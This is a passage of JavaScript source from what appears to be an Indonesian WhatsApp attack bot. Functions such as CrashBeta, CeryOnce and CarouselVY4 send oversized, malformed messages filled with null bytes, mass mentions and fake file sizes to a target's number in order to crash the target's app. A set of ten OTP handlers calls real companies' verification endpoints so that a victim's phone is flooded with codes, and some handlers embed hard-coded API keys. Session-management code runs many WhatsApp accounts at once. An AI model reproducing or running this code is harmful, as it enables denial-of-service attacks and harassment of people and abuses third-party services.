    messageParamsJson: "{".repeat(10000),
    buttons: [
        {
            name: "single_select",
            buttonParamsJson: "\n".repeat(10000),
        },
        {
            name: "mpm",
            buttonParamsJson: "\n".repeat(10000),
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "RayzNotDev@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0000".repeat(500000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
  contextInfo: {
      forwardingScore: 127,
            isForwarded: true,
                    quotedMessage: {
                             documentMessage: {
                  url: "https://mmg.whatsapp.net/text/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256:
                    "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "NanxxNotDev ☠️",
                  fileEncSha256:
                    "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath:
                    "/text/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath:
                    "/text/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256:
                    "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256:
                    "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
                    contactVcard: true
                        },
                            groupMentions: [{
                                groupJid: "1@newsletter",
                                groupSubject: "💧𝐕𝐀𝐍𝐙𝐙𝐌𝐃 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐈𝐬 𝐇𝐞𝐫𝐞💧"
                            }]
                        }
                    }
                }
            }
        }, {
            participant: {
                jid: target
            }
        }
    );
}

async function CeryOnce(target) {
   for (let p = 0; p < 85; p++) {
    const combinedMsg = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "\u0000".repeat(200),
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "address_message",
                        paramsJson: "\r".repeat(900000),
                        version: 3,
                        call_permission_data: {
                            name: "call_permission_request",
                            paramsJson: "\u0000".repeat(20000),
                            entryPointConversionSource: "call_permission_message"
                        },
                        galaxy_data: {
                            name: "galaxy_message",
                            paramsJson: JSON.stringify({
                                flow_cta: "\u0000".repeat(20000),
                                header: "\u0000".repeat(20000),
                                body: "\u0000".repeat(20000),
                                flow_action: "navigate",
                                flow_action_payload: { screen: "FORM_SCREEN" },
                                flow_id: "1169834181134583",
                                flow_message_version: "3",
                                flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                            })
                        }
                    }
                },
                contextInfo: {
                    mentionedJid: Array.from({ length:2000 }, (_, p) => `1313555000${p + 1}@s.whatsapp.net`),
                    remoteJid: "status@broadcast"
                },
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32),
                    supportPayload: JSON.stringify({
                        version: 3,
                        is_ai_message: true,
                        should_show_system_message: true,
                        ticket_id: crypto.randomBytes(16).toString('hex')
                    })
                }
            }
        }
    };

    const Cery = generateWAMessageFromContent(target, combinedMsg, {});
       
    await CeryX.relayMessage("status@broadcast", Cery.message, {
        messageId: Cery.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                }]
            }]
        }]
    });
  }
}

async function CarouselVY4(sock, target) {
  const img = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m239/AQMDTeV5_VA-OBFSuqdqXYX0-53ZJQHkoQR944ZaGcoo_GA4-3_-FypseU9Bi7f5ORRn-BQYL8vbFpfXOmxRdLVz8FkzxTf3SyA11Biz3Q?ccb=9-4&oh=01_Q5Aa2QFfCY7O3IquSb0Fvub083w1zLcGVzWCk-P1hjnUMKeSxQ&oe=68DA0F65&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: Buffer.from("i4ZgOwy4PHQmtxW+VgKPJ0LEE9i7XfAwJYk4DVKnjB4=", "base64"),
    fileLength: "62265",
    height: 1080,
    width: 1080,
    mediaKey: Buffer.from("qaiU0wrsmuE9outTy1QEV8TnPwlNAFS5kqmTLBXBugM=", "base64"),
    fileEncSha256: Buffer.from("Vw0MGUhP27kXt9W4LxnpzzYGrozU8pbzafHsxoegPq8=", "base64"),
    directPath: "/o1/v/t24/f2/m239/AQMDTeV5_VA-OBFSuqdqXYX0-53ZJQHkoQR944ZaGcoo_GA4-3_-FypseU9Bi7f5ORRn-BQYL8vbFpfXOmxRdLVz8FkzxTf3SyA11Biz3Q?ccb=9-4&oh=01_Q5Aa2QFfCY7O3IquSb0Fvub083w1zLcGVzWCk-P1hjnUMKeSxQ&oe=68DA0F65&_nc_sid=e6ed6c",
    mediaKeyTimestamp: "1756530813",
    jpegThumbnail: Buffer.from(
      "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAgMBAAAAAAAAAAAAAAAAAQMCBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADzuFlZHovO7xOj1uUREwAX0yI6XNtOxw93RIABlmFk6+5OmVN9pzsLte4BLKwZYjr6GuJgAAAAJBaD/8QAJhAAAgIBAgQHAQAAAAAAAAAAAQIAAxEQEgQgITEFExQiMkFhQP/aAAgBAQABPwABSpJOvhZwk8RIPFvy2KEfAh0Bfy0RSf2ekqKZL+6ONrEcl777CdeFYDIznIjrUF3mN1J5AQIdKX2ODOId9gIPQ8qLuOI9TJieQMd4KF+2+pYu6tK8/GenGO8eoqQJ0x+6Y2EGWWl8QMQQYrpZ2QZljV4A2e4nqRLaUKDb0jhE7EltS+RqrFTkSx+HrSsrgkjrH4hmhOf4xABP/8QAGBEAAwEBAAAAAAAAAAAAAAAAAREwUQD/2gAIAQIBAT8AmjvI7X//xAAbEQAABwEAAAAAAAAAAAAAAAAAAQIREjBSIf/aAAgBAwEBPwCuSMCSMA2fln//2Q==",
      "base64"
    ),
    contextInfo: {},
    scansSidecar: "lPDK+lpgZstxxk05zbcPVMVPlj+Xbmqe2tE9SKk+rOSLSXfImdNthg==",
    scanLengths: [7808, 22667, 9636, 22154],
    midQualityFileSha256: "kCJoJE5LX9w/KxdIQQgGtkQjP5ogRE6HWkAHRkBWHWQ="
  };
  
  for (let i = 0; i < 5; i++) {
    const cards = [
      {
        header: {
          hasMediaAttachment: true,
          imageMessage: img,
          title: "\u2060".repeat(3000) + "You Hate Me? \n" + i
        },
        body: { text: "ꦾ".repeat(9999) },
        footer: { text: "Made by haters #1st" + i },
        nativeFlowMessage: {
          messageParamsJson: "",
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: "\u0000".repeat(1000)
            },
            {
              name: "cta_copy",
              buttonParamsJson: "{\"copy_code\":\"62222222\",\"expiry\":1692375600000}"
            },
            {
              name: "cta_url",
              buttonParamsJson: "{\"display_text\":\"VIEW\",\"url\":\"https://example.com\"}"
            },
            {
              name: "galaxy_message",
              buttonParamsJson: "{\"icon\":\"REVIEW\",\"flow_cta\":\"\\u0000\",\"flow_message_version\":\"3\"}"
            },
            {
              name: "payment_info",
              buttonParamsJson: "{\"reference_id\":\"Flows\",\"amount\":50000,\"currency\":\"IDR\"}"
            },
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`
            },
            {
              name: "payment_method",
              buttonParamsJson:
                "{\"currency\":\"IDR\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"7eppeli-Yuukey\",\"type\":\"physical-goods\",\"order\":{\"status\":\"canceled\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"D | 7eppeli-Exploration\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1000}]},\"additional_note\":\"D | 7eppeli-Exploration\",\"native_payment_methods\":[],\"share_payment_status\":true}"
            }
          ]
        }
      }
    ];

    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
            interactiveMessage: {
              body: { text: "ꦾ".repeat(9999) },
              footer: { text: "4izxvelzExerc1st." },
              header: { hasMediaAttachment: true, imageMessage: img },
              carouselMessage: { cards }
            },
            contextInfo: {
              remoteJid: "30748291653858@lid",
              participant: "0@s.whatsapp.net",
              mentionedJid: ["0@s.whatsapp.net"],
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://nekopoi.care",
                    unconsentedUsersUrl: "https://nekopoi.care",
                    consentedUsersUrl: "https://nekopoi.care",
                    cardIndex: 1
                  },
                  {
                    originalUrl: "https://nekopoi.care",
                    unconsentedUsersUrl: "https://nekopoi.care",
                    consentedUsersUrl: "https://nekopoi.care",
                    cardIndex: 2
                  }
                ]
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                }
              }
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
    await new Promise(res => setTimeout(res, 500));
  }

  const msg2 = {
    extendedTextMessage: {
      text: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi \n" + "𑇂𑆵𑆴𑆿".repeat(60000),
      contextInfo: {
        fromMe: false,
        stanzaId: target,
        participant: target,
        quotedMessage: {
          conversation: "4izxvelzExec1st" + "𑇂𑆵𑆴𑆿".repeat(900)
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING"
        }
      },
      inviteLinkGroupTypeV2: "DEFAULT"
    }
  };

  await sock.relayMessage(
    target,
    msg2,
    { ephemeralExpiration: 5, timeStamp: Date.now() },
    { messageId: null }
  );

  const msg3 = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "Chat Dengan Meta AI",
        matchedText: "https://wa.me/13135550002?s=5",
        description: "҉҈⃝⃞⃟⃠⃤꙰꙲" + "𑇂𑆵𑆴𑆿".repeat(15000),
        title: "xFlows Attack" + "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: null,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    },
    { ephemeralExpiration: 5, timeStamp: Date.now() }
  );

  await sock.relayMessage(target, msg3.message, { messageId: msg3.key.id });
 };


async function CrashBeta(sock, target) {
    let virtex = `\n${"ꦾ".repeat(107777)}`;

    await sock.relayMessage(
        target,
        {
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "109951162777600",
                                pageCount: 9999999999,
                                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                fileName: "\u0003".repeat(100),
                                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1726867151",
                                contactVcard: true,
                                jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg"
                            },
                            hasMediaAttachment: true
                        },
                        body: {
                            text: virtex
                        },
                        nativeFlowMessage: {
                            name: "call_permission_request",
                            messageParamsJson: "\u0000".repeat(5000)
                        },
                        contextInfo: {
                            mentionedJid: [target],
                            forwardingScore: 1,
                            isForwarded: true,
                            fromMe: false,
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            quotedMessage: {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                    fileLength: "9999999999999",
                                    pageCount: 9999999999999,
                                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                    fileName: "\n",
                                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                    mediaKeyTimestamp: "1724474503",
                                    contactVcard: true,
                                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                    jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg"
                                }
                            }
                        }
                    }
                }
            }
        }
    );
}

async function CrashContact(target) {
   try {
       let message = {
         interactiveMessage: {
           contactMessage: {
             displayName: "ampasnoctyx",
             vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:John Doe\nTEL:+628123456789\nEND:VCARD",
             contextInfo: {
               remoteJid: "x",
               quotedMessage: {
                 paymentInviteMessage: {
                   serviceType: 2,
                   expiryTimestamp: Math.floor(Date.now() / 1000) + 86400
                 }
               }
             }
           }
         }
       };
    
    const msg = await generateWAMessageFromContent(target, message, {
      userJid: target
    });
    
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target }
    });
  } catch (err) {
    console.log(err);
  }
}

// ════════════════════════════════════════════════════════════════════════════
// AM GENERATOR FUNCTIONS
// ════════════════════════════════════════════════════════════════════════════

// ─── STEP 1: KIRIM MAGIC LINK ───────────────────────────────
async function amSendMagicLink(email) {
  console.log("[AM] 📧 Sending magic link to: " + email);
  
  const res = await axios.post(
    AM_BASE_URL + '/api/satriam/send-link',
    { email },
    { headers: AM_HEADERS, timeout: 15000 }
  );

  if (!res.data?.success) {
    throw new Error("Gagal kirim link: " + JSON.stringify(res.data));
  }

  console.log("[AM] ✅ Magic link sent");
  return res.data;
}

// ─── STEP 2: VERIFY MAGIC LINK ──────────────────────────────
async function amVerifyMagicLink(email, magicLink) {
  console.log("[AM] 🔐 Verifying magic link...");
  
  const res = await axios.post(
    AM_BASE_URL + '/api/satriam/verify-link',
    { email, magicLink },
    { headers: AM_HEADERS, timeout: 15000 }
  );

  if (!res.data?.success) {
    throw new Error("Verifikasi gagal: " + JSON.stringify(res.data));
  }

  console.log("[AM] ✅ Verified | UID: " + res.data.uid + " | Plan: " + res.data.planName);
  return res.data;
}

// ─── 10 OTP HANDLER STABIL ──────────────────────────────────────

const otpHandlers = {};

// 1. Internet Rakyat (✅ WORK)
otpHandlers.internetrakyat = async (phone) => {
  const phone08 = fmt08(phone);
  try {
    const resp = await axios.post('https://internetrakyat.id/api/app/auth/send-otp-register', {
      phone_number: phone08
    }, {
      headers: {
        'Content-Type': 'application/json',
        'x-api-key': '280999!FTTH',
        'User-Agent': getRandomUserAgent(),
        'Origin': 'https://internetrakyat.id',
        'Referer': 'https://internetrakyat.id/auth/register',
      },
      timeout: 15000
    });
    return { success: resp.status === 200 || resp.status === 201, status: resp.status };
  } catch (e) {
    return { success: false, error: e.message };
  }
};

// 2. Klook (✅ WORK)
otpHandlers.klook = async (phone) => {
  const formatted = phone.startsWith('+') ? phone : '+' + phone.replace(/^0+/, '62');
  try {
    const resp = await axios.post('https://www.klook.com/v2/userapisrv/public/verification/code/send?trace_id=' + crypto.randomUUID(), {
      action: 'login_register',
      type: 1,
      rcv: formatted,
      is_resend: false,
      payload: { mobile: formatted, term_ids: [330], mobile_token: '', invite_code: '' },
      _rc: '', rcv_token: ''
    }, {
      headers: {
        'Content-Type': 'application/json',
        'x-klook-user-residence': '15_SG',
        'User-Agent': getRandomUserAgent(),
        'Origin': 'https://www.klook.com',
        'Referer': 'https://www.klook.com/en-SG/signin/?aid=87721',
      },
      timeout: 15000
    });
    return { success: resp.status === 200 || resp.status === 201, status: resp.status };
  } catch (e) {
    return { success: false, error: e.message };
  }
};

// 3. Watsons (✅ WORK)
otpHandlers.watsons = async (phone) => {
  const phoneNoCode = fmtNoCode(phone);
  try {
    const resp = await axios.post('https://api.watsons.co.id/api/v2/wtcid/otpToken?formId=registrationOTPForm_Web3&lang=id&curr=IDR', {
      uid: '', action: 'GENERAL', countryCode: '62', target: phoneNoCode, type: 'WHATSAPP'
    }, {
      headers: {
        'Content-Type': 'application/json',
        'authorization': 'bearer Pi_D6dqblYElXgy4mWOXjkLCaZg',
        'User-Agent': getRandomUserAgent(),
        'Origin': 'https://www.watsons.co.id',
        'Referer': 'https://www.watsons.co.id/',
      },
      timeout: 15000
    });
    return { success: resp.status === 200, status: resp.status };
  } catch (e) {
    return { success: false, error: e.message };
  }
};

// 4. Fastwork (✅ WORK)
otpHandlers.fastwork = async (phone) => {
  const phone08 = fmt08(phone);
  try {
    const resp = await axios.post('https://api.fastwork.id/auth/v2/signup.sendVerificationCode', {
      phone_number: phone08
    }, {
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': getRandomUserAgent(),
        'Origin': 'https://fastwork.id',
        'Referer': 'https://fastwork.id/',
      },
      timeout: 15000
    });
    return { success: resp.status === 200 || resp.status === 201, status: resp.status };
  } catch (e) {
    return { success: false, error: e.message };
  }
};

// 5. Auto2000 (✅ WORK)
otpHandlers.auto2000 = async (phone) => {
  const phone08 = fmt08(phone);
  try {
    const resp = await axios.post('https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp', {
      phoneNumber: phone08, isCheckOtpLimit: true, uniqueID: phone08, isLogin: false
    }, {
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': getRandomUserAgent(),
        'Origin': 'https://auto2000.co.id',
        'Referer': 'https://auto2000.co.id/login',
      },
      timeout: 15000
    });
    return { success: resp.status === 200 && resp.data?.acknowledge === 1, status: resp.status };
  } catch (e) {
    return { success: false, error: e.message };
  }
};

// 6. Sahabat Teknisi (✅ WORK)
otpHandlers.sahabatteknisi = async (phone) => {
  const phone08 = fmt08(phone);
  try {
    const resp = await axios.post('https://www.sahabatteknisi.co.id/api/auth/otp/check-phone', {
      phone: phone08
    }, {
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': getRandomUserAgent(),
        'Origin': 'https://www.sahabatteknisi.co.id',
        'Referer': 'https://www.sahabatteknisi.co.id/checkout/confirm',
      },
      timeout: 15000
    });
    return { success: resp.status === 200 || resp.status === 201, status: resp.status };
  } catch (e) {
    return { success: false, error: e.message };
  }
};

// 7. PlanetBan (✅ WORK - BARU)
otpHandlers.planetban = async (phone) => {
  const phone08 = fmt08(phone);
  try {
    const resp = await axios.post('https://api.planetban.com/website/customer/request-otp', {
      name: 'Test',
      phone: phone08,
      password: 'Test123',
      purpose: 'register',
      method: 'whatsapp'
    }, {
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': getRandomUserAgent(),
        'Origin': 'https://planetban.com',
      },
      timeout: 15000
    });
    return { success: resp.status === 200 || resp.status === 201, status: resp.status };
  } catch (e) {
    return { success: false, error: e.message };
  }
};

// 8. TuneUp (✅ WORK - BARU)
otpHandlers.tuneup = async (phone) => {
  const phone08 = fmt08(phone);
  const name = randomString(6);
  try {
    const resp = await axios.post('https://api.tuneup.id/v1/mitra/register/send-otp', {
      company_name: 'PT ' + name.charAt(0).toUpperCase() + name.slice(1),
      owner_name: name.charAt(0).toUpperCase() + name.slice(1),
      address: randomString(10),
      email: name + '@mailnesia.com',
      phone_number: phone08,
      province_code: '32',
      city_code: '32.04',
      subscription_id: 'undefined',
      channel: 'whatsapp',
      agreement: 'true',
      'service_categories[]': '3',
    }, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': getRandomUserAgent(),
        'Origin': 'https://dashboard.tuneup.id',
        'Referer': 'https://dashboard.tuneup.id/',
      },
      timeout: 15000
    });
    return { success: resp.status === 200 || resp.status === 201, status: resp.status };
  } catch (e) {
    return { success: false, error: e.message };
  }
};

// 9. Ultramilk (✅ WORK - BARU)
otpHandlers.ultramilk = async (phone) => {
  const name = randomString(6);
  try {
    const resp = await axios.post('https://ultramilk-clp.kata.ai/api/ultramilk/register', {
      name: name,
      email: name.toLowerCase() + '@gmail.com',
      password: randomPassword(),
      phone_number: phone,
      portal: 'IcownicPatch',
      is_consent: true
    }, {
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': getRandomUserAgent(),
        'Origin': 'https://www.icownicpatch.com',
        'Referer': 'https://www.icownicpatch.com/',
      },
      timeout: 15000
    });
    return { success: resp.status === 200 || resp.status === 201, status: resp.status };
  } catch (e) {
    return { success: false, error: e.message };
  }
};

// 10. HashMicro (✅ WORK - BARU)
otpHandlers.hashmicro = async (phone) => {
  const phone08 = fmt08(phone);
  const name = randomString(6);
  const email = name.toLowerCase() + '@gmail.com';
  try {
    const formData = new URLSearchParams();
    formData.append('medium', '55');
    formData.append('type_button', 'mulai-konsultasi');
    formData.append('fullname', name.charAt(0).toUpperCase() + name.slice(1));
    formData.append('phonenumber', phone08);
    formData.append('email', email);
    formData.append('companyname', 'PT ' + name);
    formData.append('company_size', 'small');
    formData.append('solution', '43');
    formData.append('industry', Math.random() > 0.5 ? '178' : '179');
    formData.append('message', 'Test');
    formData.append('country', '100');
    formData.append('clr_id', 'mq51xj8x-WzwfG4IcQKi0c056');
    formData.append('campaigndata', 'HashMicro');
    formData.append('source', '143');
    formData.append('user_agent', getRandomUserAgent());
    formData.append('duration_page', String(Math.floor(Math.random() * 900000) + 100000));
    formData.append('blp_medium', '120');
    formData.append('user_device', 'mobile');
    formData.append('scroll_depth', '100');
    formData.append('visitorcountry', '100');
    formData.append('conversion_tracked', 'Yes');
    formData.append('fingerprint', crypto.randomUUID().replace(/-/g, ''));
    formData.append('scale', 'small');
    formData.append('position', '43');
    formData.append('team', '6');
    formData.append('honeypot', '');
    formData.append('ipaddrs', '127.0.0.1');
    formData.append('uip', '127.0.0.1');
    formData.append('provn', 'Jakarta');

    const resp = await axios.post('https://website-api.hashmicro.com/api/add/3', formData.toString(), {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': getRandomUserAgent(),
        'Origin': 'https://www.hashmicro.com',
        'Referer': 'https://www.hashmicro.com/',
      },
      timeout: 15000
    });
    return { success: resp.status === 200 || resp.status === 201, status: resp.status };
  } catch (e) {
    return { success: false, error: e.message };
  }
};



// ─── DAFTAR SEMUA HANDLER ─────────────────────────────────────────

const otpHandlerList = Object.keys(otpHandlers);
// ======================================= //
// WhatsApp Connect Logic
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


const mess = {};  // Untuk WA Messenger

function prepareAuthFolders() {
  const userId = "vanzzmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files; // ✅ Tambahkan return
  } catch (err) {
    console.error("Buat Folder 'vanzzmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestWaWebVersion();

  const sock = makeWASocket({
    keepAliveIntervalMs: 50000,
    logger: pino({ level: "silent" }),
    auth: state,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    generateHighQualityLinkPreview: true,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    version
  });


      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}
async function connectNewUserSessionsOnly() {
  const userIdFolder = "vanzzmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    // Skip jika sudah ada koneksi aktif
    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    // Sambungkan sesi baru
    connectSession(sessionFolder, baseName);
  }
}

// Jika ingin refresh tanpa putus semua, pakai ini:
async function refreshUserSessions() {
  await startUserSessions();
  //startLoop();
}

